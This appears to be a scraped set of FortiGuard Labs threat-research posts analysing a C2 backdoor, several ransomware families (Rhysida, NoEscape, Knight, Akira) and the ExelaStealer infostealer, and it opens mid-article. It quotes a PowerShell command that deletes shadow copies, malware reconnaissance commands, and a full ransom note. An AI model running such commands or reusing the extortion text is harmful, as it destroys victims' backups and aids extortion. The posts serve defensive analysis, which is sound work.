0 and terminates. The C2 configuration stored in “netpp.ini” is encrypted using AES-CTR, and the key is derived from the service name established in the preceding step, namely, “netpp.” The first 16 bytes of “netpp.ini” are used as the Initialization Vector (IV) to decrypt and unveil the C2 server list, as seen in Figure 9. The program then adds a registry entry using the command “cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f” and begins gathering information from the compromised system. It uses the command “cmd /c systeminfo” to collect comprehensive details about the target system, including the operating system version, system manufacturer, available hotfixes, system uptime, and network configuration. This data is stored in a temporary file, and the program concatenates the string “rr “ with the system's time to create the file name. Following this, it executes “cmd /c makecab” to compress the file unless the temporary file has one of the following extensions: \".7z,\" \".zip,\" \".rar,\" \".cab,\" \".docx,\" or \".xlsx,\" as shown in Figure 10. Next, using the AES-CTR algorithm, it uses the filename as the key to encrypt the CAB file. The encrypted data is then uploaded to the C2 server via a POST request, employing a hardcoded HTTP syntax, as illustrated in Figure 11. Afterward, it utilizes the command \"cmd /c tasklist” to fetch a list of currently active processes on the system. This helps the threat actor understand the system's status and potentially identify implemented security measures. This data undergoes the same procedure as the earlier process and is transmitted to the C2 server. The entire C2 request is directed to “up.php” with the parameter “name=%PCNAME%,” as shown in Figure 12. Following the upload, the program removes the temporary file to eliminate traces. Next, it attempts to get a payload or command from the C2 server by dispatching an HTTP request to “dn.php” with the parameters “name=%PCNAME%” and “prefix.” The potential values for “prefix” include “cc” followed by a digit or a straightforward string “tt.” The C2 sessions are illustrated in Figure 13. Although the actual command from the C2 server remains undisclosed, we can deduce it from the assembly code within the DLL file. Upon receiving a response from the server, the system dissects the data using “#” as a delimiter, performs base64 decoding, and decrypts the information using AES. The deciphered content is then stored as a temporary file. The program then executes “cmd /c expand –R” to retrieve the payload for subsequent actions, as shown in Figure 14. Figure 15 shows the partial code of how it handles the C2 commands, which include executing a command with specific privileges, downloading a file, and uploading a particular file. This article explores an advanced toolset employed by a sophisticated threat actor within a Word document using batch scripts and DLL files. The payload incorporates a UAC bypass and encrypted communication with a C2 server, enabling the threat actor to execute privileged commands.

    "content": "FortiGuard Labs Threat Research The goal of theFortiGuard IR teamis to provide organizations with valuable insights from threat analysis to bolster their security posture. We recently conducted acomprehensive analysis of an incident involving the Rhysida ransomware group, shedding light on their operations, tactics, and impact, including a novel technique involving ESXi-based ransomware. The Rhysida group was first identified in May 2023, when they claimed their first victim. This group deploys a ransomware variant known asRhysidaand also offers it asRansomware-as-a-service (RaaS). The group has listed around 50 victims so far in 2023. The investigation conducted by the FortiGuard IR team and MDR team uncovered some of the techniques and tools used by Rhysida: The initial detection was identified by the FortiGuard MDR team. The threat actor was observed accessing systems in a victim's network and attempting to create memory dumps and gather user data. FortiEDR detected these events, allowing the MDR team to analyze them further. Following the initial detection and triage, the FortiGuard IR team was engaged to conduct a complete analysis. The threat actors abuse legitimate software such as PowerShell to gain information about users and systems within the network, PSExec to schedule tasks and make changes to registry keys to maintain persistence, AnyDesk for remote connections, and WinSCP for file transfers. The threat actors also attempt to exfiltrate data from various systems using MegaSync. The report also covers the additional malware the FortiGuard IR Team identified, along with a technique we don’t often see where the group deployed Windows and Linux binaries. Restricting Veeam access to only designated machines hindered the threat actors from gaining access to the backup files. Moreover, the prudent management of passwords for vSphere fortified the victim's defense. The Rhysida ransomware group is known to target vSphere and look for credentials, so the safeguards that the victim implemented were vital to preventing widespread ransomware of the virtual infrastructure. Staying informed on the landscape of cyber threats is critical. This analysis of the Rhysida group serves as a valuable resource for organizations. By uncovering motives and impact, theFortiGuard IR teams’ findings can guide proactive strategies.

    "title": "Ransomware Roundup – NoEscape",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-noescape",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the NoEscape ransomware. Affected platforms:Microsoft Windows, Linux, and ESXiImpacted parties:Microsoft Windows, Linux, and ESXi UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High NoEscape is a financially motivated ransomware group that emerged in May 2023. The group runs a Ransomware-as-a-Service program. The developer creates and provides necessary pre- and post-infection tools for affiliates to perform malicious activities such as compromising victims, data exfiltration, and encryptor (ransomware) deployments. The group has victimized numerous organizations across multiple industries, including government, energy, hospitals, and physicians’ clinics. The NoEscape ransomware group is believed to be related to the now-defunct Avaddon ransomware group. Information on the infection vector used by the NoEscape ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. According to data collected through Fortinet'sFortiRecon service, the NoEscape ransomware group has targeted multiple industry verticals (Figure 1). Business services were most impacted by the ransomware, followed by the manufacturing and retail sectors. Victims of the NoEscape ransomware also include government organizations, hospitals, and medical clinics. When victim organizations are ranked according to country (Figure 2), the United States leads by a wide margin. As of November 3, 2023, the NoEscape ransomware group had last posted new victims on October 27th. Once a network has been compromised and data has been exfiltrated, the NoEscape attacker deploys and runs a file encryptor, which terminates the following services and processes: The ransomware encrypts files on the compromised systems and appends a “.[random 10-character uppercase alphabet]” extension to the affected files. The ransomware avoids encrypting the following file extensions: The NoEscape ransomware also exempts the following directories from file encryption: It then leaves a ransom note titled “HOW_TO_RECOVER_FILES.txt.” The ransom note instructs victims to visit a TOR site for further instructions. The actual ransom negotiation takes place on TOX. It also insists that the NoEscape ransomware group is financially driven and is not politically motivated. The NoEscape ransomware has variants that affect Linux and VMware ESXi. The NoEscape ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. Victims are instructed to visit the TOR site below and enter the unique personal ID listed on the ransom note. As of November 3, the “NoEscape” blog lists 20 active NoEscape ransomware victims. If victims do not comply with the attacker's request, another message is added to the page assigned to each victim urging action. Some of those messages are below: Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the NoEscape ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "title": "Threat Predictions for 2024: Chained AI and CaaS Operations Give Attackers More “Easy” Buttons Than Ever",
    "link": "https://www.fortinet.com/blog/threat-research/2024-threat-predictions-chained-ai-and-caas-operations",
    "content": "FortiGuard Labs Threat Research With the growth of Cybercrime-as-a-Service (CaaS) operations and the advent of generative AI, threat actors have more “easy” buttons at their fingertips to assist with carrying out attacks than ever before. By relying on the growing capabilities in their respective toolboxes, adversaries will increase the sophistication of their activities. They’ll launch more targeted and stealthier hacks designed to evade robust security controls, as well as become more agile by making each tactic in the attack cycle more efficient. In our2024 threat predictions report, our FortiGuard Labs team looks at a new era of advanced cybercrime, examines how AI is changing the (attack) game, shares fresh threat trends to watch for this year and beyond, and offers advice on how organizations everywhere can enhance their collective resilience against an evolving threat landscape. We've been observing and discussing many fan-favorite attack tactics for years and covered these topicsin past reports. The \"classics\" aren't going away—instead, they're evolving and advancing as attackers gain access to new resources. For example, when it comes to advanced persistent cybercrime, we anticipate more activity among a growing number of advanced persistent threat (APT) groups. In addition to the evolution of APT operations, we predict that cybercrime groups, in general, will diversify their targets and playbooks, focusing on more sophisticated and disruptive attacks, and setting their sights on denial of service and extortion. Cybercrime \"turf wars\" continue, with multiple attack groups homing in on the same targets and deploying ransomware variants, often within 24 hours or less. In fact, we’ve observed such a rise in this type of activity that the FBIissued a warningto organizations about it earlier this year. And let’s not forget about the evolution of generative AI. This weaponization of AI is adding fuel to an already raging fire, giving attackers an easy means of enhancing many stages of their attacks. As we’ve predicted in the past, we’re seeing cybercriminals increasingly use AI to support malicious activities in new ways, ranging from thwarting the detection of social engineering tomimicking human behavior. While cybercriminals will always rely on tried-and-true tactics and techniques to achieve a quick payday, today’s attackers now have a growing number of tools available to them to assist with attack execution. As cybercrime evolves, we anticipate seeing several fresh trends emerge in 2024 and beyond. Here’s a glimpse of what we expect. Next-level playbooks:Over the past few years, ransomware attacks worldwide have skyrocketed, making every organization, regardless of size or industry, a target. Yet, as an increasing number of cybercriminals launch ransomware attacks to attain a lucrative payday, cybercrime groups are quickly exhausting smaller, easier-to-hack targets. Looking ahead, we predict attackers will take a \"go big or go home\" approach, with adversaries turning their focus to critical industries—such as healthcare, finance, transportation, and utilities—that if hacked, would have a sizeable adverse impact on society and make for a more substantial payday for the attacker. They’ll also expand their playbooks, making their activities more personal, aggressive, and destructive in nature. It's a new day for zero days:As organizations expand the number of platforms, applications, and technologies they rely on for daily business operations, cybercriminals have unique opportunities to uncover and exploit software vulnerabilities. We've observed arecord numberof zero days and new Common Vulnerabilities and Exposures (CVEs) emerge in 2023, and that count is still rising. Given how valuable zero days can be for attackers, we expect to see zero-day brokers—cybercrime groups selling zero days on the dark web to multiple buyers—emerge among the CaaS community. N-days will continue to pose significant risks for organizations as well. Playing the inside game:Many organizations are leveling up their security controls and adopting new technologies and processes to strengthen their defenses. These enhanced controls make it more difficult for attackers to infiltrate a network externally, so cybercriminals must find new ways to reach their targets. Given this shift, we predict that attackers will continue to shift left with their tactics, reconnaissance, and weaponization, with groups beginning to recruit from inside target organizations for initial access purposes. Ushering in “we the people” attacks:Looking ahead, we expect to see attackers take advantage of more geopolitical happenings and event-driven opportunities, such as the 2024 U.S. elections and the Paris 2024 games. While adversaries have always targeted major events, cybercriminals now have new tools at their disposal—generative AI in particular—to support their activities. Narrowing the TTP playing field:Attackers will inevitably continue to expand the collection of tactics, techniques, and procedures (TTPs) they use to compromise their targets. Yet defenders can gain an advantage by finding ways to disrupt those activities. While most of the day-to-day work done by cybersecurity defenders is related to blocking indicators of compromise, there's great value in taking a closer look at the TTPs attackers regularly use, which will help narrow the playing field and find potential “choke points on the chess board.” Making space for more 5G attacks:With access to an ever-increasing array of connected technologies, cybercriminals will inevitably find new opportunities for compromise. With more devices coming online every day, we anticipate that cybercriminals will take greater advantage of connected attacks in the future. A successful attack against 5G infrastructure could easily disrupt critical industries such as oil and gas, transportation, public safety, finance, and healthcare. Cybercrime impacts everyone, and the ramifications of a breach are often far-reaching. However, threat actors don't have to have the upper hand. Our security community can take many actions to better anticipate cybercriminals' next moves and disrupt their activities:collaboratingacross the public and private sectors to share threat intelligence, adopting standardized measures for incident reporting, and more. Organizations also have a vital role to play in disrupting cybercrime. This starts with creating a culture of cyber resilience—making cybersecurity everyone’s job—by implementing ongoing initiatives such as enterprisewide cybersecurity education programs and more focused activities like tabletop exercises for executives. Finding ways to shrink the cybersecurity skills gap, such as tapping intonew talent poolsto fill open roles, can help enterprises navigate the combination of overworked IT and security staff as well as the growing threat landscape.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Knight ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Knight is a relatively new ransomware group that arrived in August 2023. Like many attackers, the gang behind this variant employs double extortion tactics, where the Knight ransomware encrypts files on victims’ machines and exfiltrates data for extortion purposes. The predecessor of Knight, Cyclops, had multi-OS tools for Windows, Linux, and Mac OS. So, while FortiGuard Labs had only located a Windows version of the Knight ransomware at the time of our investigation, it seems likely that other versions may be on the way. According to anadvisoryby CERT Italy in early September, Knight targeted Italian organizations with phishing campaigns using emails with malicious attachments. The same was reported in early August by security researcher@felixw3000. In addition, Remcos and Qakbot malware are known to deliver the Knight ransomware to compromised machines. According to data collected through Fortinet'sFortiRecon service, the Knight ransomware group has targeted multiple industry verticals. While Retail was most affected by the Knight ransomware, the group also victimized organizations in healthcare, including hospitals, physicians’ clinics, and dental offices, indicating that the threat actor has no reservations about impacting people who need medical care. When classifying victim organizations by country, the United States is in first place by a significant margin. As of October 20, 2023, the Knight ransomware group had last posted new victims on October 18th. Once a network has been compromised and data has been exfiltrated, files encrypted by the Knight ransomware are appended with a “.knight_l” file extension. It then drops a ransom note labeled, “How To Restore Your Files.txt.” Because the Knight ransomware targets enterprises, the ransom fee is set at a relatively high price. However, the Bitcoin wallet in this ransom note had no recorded transactions at the time of our investigation. The Knight ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. The group also uses another TOR site for disclosing stolen data and has abused several publicly available file-sharing services, such as Mega, Gofile, and UploadNow. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Knight ransomware samples with the following AV signature: FortiGuard Labs detects the known Knight ransomware droppers with the following AV signature: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Known hosting sites of the Knight ransomware droppers are blocked by the Web filtering client.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "title": "Another InfoStealer Enters the Field, ExelaStealer",
    "link": "https://www.fortinet.com/blog/threat-research/exelastealer-infostealer-enters-the-field",
    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:The information collected can be used for future attacksSeverity Level:Medium In 2023, the InfoStealer market is a reasonably crowded affair. The likes of RedLine, Raccoon, and Vidar own a significant market share, with new entrants such as SaphireStealer appearing frequently. The latest entry, ExelaStealer has now taken the field. Very little backstory is available on ExelaStealer, with the earliest public mentions FortiGuard Labs could locate occurring in August 2023. FortiGuard Labs research reveals that ExelaStealer is a largely open-source InfoStealer with paid customizations available from the threat actor. It is written in Python, although it pulls resources from other languages (e.g., JavaScript) where needed. It can steal sensitive information from a Windows-based host (e.g., passwords, credit cards, cookies and session data, and general keylogging). FortiGuard Labs was able to obtain a sample. This blog will analyze its inner workings. Advertising on the Dark Web for ExelaStealer offers both an open-source and paid-for version. These advertisements also provide good insight into its capabilities. Some ads appear to have been posted by the prime contact for ExelaStealer, an individual or group using the handle “quicaxd.” As shown in Figure 2, the cost for a month of use is $20, while three months is $45. A lifetime subscription is $120. Additionally, its Telegram channel is shown, which was active at the time of writing. Its Telegram home allows individuals to purchase a copy of the paid-for version and the GitHub repo for the open-source version. Anyone with the necessary skills could create an ExelaStealer binary using the freely available source code. The malware can currently only be compiled and packaged on a Windows-based host. The primary code for the malware is contained in a file named “Exela.py.” The build process is initiated using a batch file that then calls Python and the “builder.py” file. The builder uses a file named “obf.py” to make the calls necessary to obfuscate ExelaStealer’s code, making it harder to analyze. The non-library and now obfuscated code is distilled into a file named “Obfuscated.py,” which is ready for use. The binaries analyzed by FortiGuard Labs appeared to have been released as part of a specific campaign. The use of a decoy document supports this. Unfortunately, the initial infection vector was not available to us. However, initial infection could be achieved in any number of ways (e.g., phishing, watering holes, other malware, etc.). This binary acts as a container and first stage for the deployment. Its job is the spawning of the “sirket-ruhsat-pdf.exe”  (95d860570b2777d7af213f9b48747d528251facada54842d7a07a5798fcbfe51) executable and launching a PDF viewer to display a decoy document (BNG 824 ruhsat.pdf) to the user. It will deposit both files into the root of the C: Drive. “sirket-ruhsat-pdf.exe” automatically attempts to find a compatible viewer and launch “BNG 824 ruhsat.pdf”. The PDF is a copy of a Turkish vehicle registration certificate for a Dacia Duster. The document is entirely benign and simply a visual decoy to the user. “sirket-ruhsat-pdf.exe” is a PyInstaller executable. As such, a tool such as “pyinstxtractor” (https://github.com/extremecoders-re/pyinstxtractor) can extract the archive's contents for inspection. The executable is most likely signed with a fraudulent or invalid certificate and uses the name “Runtime Broker,” a legitimate Microsoft process. Figure 10 shows the compiled version of the “Obfuscated.py” file. Using another tool, such as “pycdc” (Python Byte-code Disassembler/Decompiler - https://github.com/zrax/pycdc), the code in “Obfuscated.pyc” can be decompiled. Unfortunately, as good as its word, function names and variable values in the file are heavily obfuscated, increasing the time required to analyze it statically. That does not make it impossible, however. A large blob of data in the code looks out of place compared to the rest of the instructions. Functions at the end of the file allow for its decoding and execution. By taking those functions and depositing them with the blob into a test script, we can obtain the full decoded contents for review. Figure 14 shows the final output, which you’ll note is the code for “Exela.py.” except in this case, it is being used in the wild. Turning our attention to dynamic analysis, the first activity that “sirket-ruhsat-pdf.exe” will complete is spawning itself in a new process. ExelaStealer then runs the following two commands: These collect the version of Windows and the host’s UUID (Universally Unique Identifier). What follows next is a base-64 encoded PowerShell command. Decoded, this command attempts to grab a screenshot of whatever is currently displayed on the screen. A flurry of both PowerShell and command-line items then follows: These commands copy images from the Clipboard and gather basic system information, basic physical disk information, user information, firewall status, and, interestingly, WLAN status and profile. To store this information locally before sending it back to the TA, a folder is created in “C:\\Users\\<user>\\AppData\\Local\\Temp\\” and named using the UUID of the host. Each text file contains a URL back to the Telegram channel of the TA. The files are packaged into a Zip archive using the same name as the folder (the UUID). This is then sent using a Discord webhook (https://discord.com/developers/docs/resources/webhook) to post to a TA-controlled Discord channel. Data has become a valuable currency, and because of this, attempts to gather it will likely never cease. InfoStealer malware exfiltrates data belonging to corporations and individuals that can be used for blackmail, espionage, or ransom. Despite the number of infostealers in the wild, ExelaStealer shows there is still room for new players to emerge and gain traction. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness.

On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Akira ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows and Linux UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Akira is a relatively new ransomware variant with Windows and Linux versions that came out in April 2023. Like many attackers, the gang behind this variant only uses the ransomware to encrypt files after first breaking into a network and stealing data. This group also employs a double extortion tactic, demanding a ransom from victims in exchange for file decryption and not leaking stolen information to the public. According to anadvisoryissued by CERT India, Akira typically targets organizations running a VPN (virtual private network) service without multi-factor authentication configured. Purchasing network access from the initial access brokers is another possibility. According to data collected through Fortinet'sFortiRecon service, the Akira ransomware group has targeted various industry sectors. While Manufacturing is its most targeted sector, it only leads the second-ranked sector, Business Services, by 2%. Other industry sectors are mostly evenly targeted, which indicates that the Akira ransomware group victimized any organizations they found vulnerable. When victim organizations are classified by country, the United States is in first place by a significant margin. As of September 22, 2023, the Akira ransomware group had last posted new victims on September 18th. Once a network has been compromised and data has been exfiltrated, the ransomware group will deploy the Windows version of the Akira ransomware to machines running the Windows operating system. The ransomware looks for and encrypts files on those machines. However, it skips the following file extensions for file encryption: The following directories are also excluded from file encryption: The Akira ransomware offers a few command-line options for attackers when executing: The ransomware adds a “.akira” extension to encrypted files. It then drops the following ransom note, labeled \" akira_readme.txt,\" in every folder where files are encrypted. It also runs the following PowerShell command to delete Shadow Copies, which makes file recovery difficult. powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" The Linux version of the Akira ransomware targets files with the following extensions for encryption: \".4dd\", \".4d\", \".accdb\", \".accdc\", \".accde\", \".accdr\", \".accdt\", \".accft\", \".adb\", \".ade\", \".adf\", \".adp\", \".arc\", \".ora\", \".alf\", \".ask\", \".btr\", \".bdf\", \".cat\", \".cdb\", \".ckp\", \".cma\", \".cpd\", \".dacpac\", \".dad\", \".dadiagrams\", \".daschema\", \".db\", \".db-shm\", \".db-wa\", \".db3\", \".dbc\", \".dbf\", \".dbs\", \".dbt\", \".dbv\", \".dbx\", \".dcb\", \".dct\", \".dcx\", \".dd\", \".dlis\", \".dp1\", \".dqy\", \".dsk\", \".dsn\", \".dtsx\", \".dx\", \".eco\", \".ecx\", \".edb\", \".epim\", \".exb\", \".fcd\", \".fdb\", \".fic\", \".fmp\", \".fmp12\", \".fmps\", \".fo\", \".fp3\", \".fp4\", \".fp5\", \".fp7\", \".fpt\", \".frm\", \".gdb\", \".grdb\", \".gwi\", \".hdb\", \".his\", \".ib\", \".idb\", \".ihx\", \".itdb\", \".itw\", \".jet\", \".jtx\", \".kdb\", \".kexi\", \".kexic\", \".kexis\", \".lgc\", \".lwx\", \".maf\", \".maq\", \".mar\", \".mas\", \".mav\", \".mdb\", \".mdf\", \".mpd\", \".mrg\", \".mud\", \".mwb\", \".myd\", \".ndf\", \".nnt\", \".nrmlib\", \".ns2\", \".ns3\", \".ns4\", \".nsf\", \".nv\", \".nv2\", \".nwdb\", \".nyf\", \".odb\", \".oqy\", \".orx\", \".owc\", \".p96\", \".p97\", \".pan\", \".pdb\", \".pdm\", \".pnz\", \".qry\", \".qvd\", \".rbf\", \".rctd\", \".rod\", \".rodx\", \".rpd\", \".rsd\", \".sas7bdat\", \".sbf\", \".scx\", \".sdb\", \".sdc\", \".sdf\", \".sis\", \".spq\", \".sq\", \".sqlite\", \".sqlite3\", \".sqlitedb\", \".te\", \".temx\", \".tmd\", \".tps\", \".trc\", \".trm\", \".udb\", \".ud\", \".usr\", \".v12\", \".vis\", \".vpd\", \".vvv\", \".wdb\", \".wmdb\", \".wrk\", \".xdb\", \".xld\", \".xmlff\", \".abcddb\", \".abs\", \".abx\", \".accdw\", \".adn\", \".db2\", \".fm5\", \".hjt\", \".icg\", \".icr\", \".lut\", \".maw\", \".mdn\", \".mdt\", \".vdi\", \".vhd\", \".vmdk\", \".pvm\", \".vmem\", \".vmsn\", \".vmsd\", \".nvram\", \".vmx\", \".raw\", \".qcow2\", \".subvo\", \".bin\", \".vsv\", \".avhd\", \".vmrs\", \".vhdx\", \".avdx\", \".vmcx\", \".iso\" The Linux variant of Akira also uses various symmetric key algorithms for file encryption, including AES, CAMELLIA, DES, and IDEA. One notable thing about the Linux version is that it excludes the same file extensions and directories from file encryption as the Windows version. This indicates that the attacker has ported the Windows version to Linux. It also drops the same ransom note as the Windows version: The Akira ransomware group owns its own TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. Unlike the TOR sites used by other ransomware groups, Akira’s TOR site accepts commands and displays results. For example, executing the “leaks” command will bring up links to the stolen data and the information on victim organizations. The Akira attacker has also made that data available on Torrent. Another command, “news,” brings up a list of victim organizations and their information. As of September 22, 2023, the latest victims had been posted on September 18. The Akira ransomware has claimed six victims so far in September 2023. The group went hot in August, victimizing more than 20 organizations. We have also observed at least a few minor variants of Akira ransomware. The latest minor variant is Megazord, which came out in late August 2023. “Megazord” evokes the giant robot from the Japanese superhero drama series Power Rangers. The attacker’s pick of “Megazord” is fitting for an Akira variant as the name “Akira” was most likely taken from a popular Japanese cyberpunk comic and movie with the same name. The variant drops a ransom note labeled “powerranges.txt”. The content of “powerranges.txt” is below: Hi friends, Whatever who you are and what your title is if you're reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption. Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment, you have to know: 1. Dealing with us you will save A LOT dueto we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal. 2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. If you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them - in this case we won't be able to help. 3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we've managed to detect and used in order to get into, identify backup solutions and upload your data. 4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes - generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones. Then all of this will be published in our blog - https://akira[removed].onion. 5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us. If you're indeed interested in our assistance and the services we provide you can reach out to us following simple instructions: 1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/. 2. Paste this link - https://akira[removed].onion. 3. Use this code – [removed] - to log into our chat. Keep in mind that the faster you will get in touch, the less damage we cause. As shown, Megazord’s ransom note asks victims to visit the Akira ransomware’s TOR site. There is one other Megazord ransomware variant. However, that variant only has the attacker’s Telegram channel and Tox ID for contact methods. Interestingly, Megazord is written in Rust, whereas a typical Akira build is in C++. This may indicate that future Akira variants will be written in Rust or that it is going through a rebranding. Only time will tell. Older minor variants came out in May and June of 2023. One minor variant from May adds a “.iqoj” extension to the encrypted files and leaves a ransom note labeled “readme-asldkas.txt.” Another minor variant from June appends a “.zhq” extension to encrypted files and drops “help-you.txt” as a ransom note. Although the file extensions and ransom note names do not have any “Akira” in them, they still lead victims to Akira’s TOR site. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Akira ransomware samples with the following AV signature: FortiGuard Labs detects minor variants of the Akira ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

